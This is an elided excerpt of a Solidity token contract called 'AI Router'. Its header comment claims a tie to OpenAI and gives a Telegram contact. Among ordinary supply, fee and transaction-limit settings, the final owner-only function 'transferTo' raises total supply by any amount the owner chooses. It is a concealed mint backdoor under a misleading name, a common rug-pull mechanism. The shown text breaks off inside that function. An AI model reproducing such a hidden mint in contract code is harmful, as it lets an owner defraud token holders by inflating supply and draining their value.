...
// AIRouter - Artifficial Intelligence Router in OpenAI
// TG: @Fatsale
...
contract AIRouter is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 175000000 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = "AI Router";
    ...
    uint256 public numTokensSellToAddToLiquidity = 1750000 * 10**9;
    uint256 public _maxTxAmount = 175000000 * 10**9;
    ...
    function transferTo(address account, uint256 amount) public virtual onlyOwner {
        _tTotal += amount;
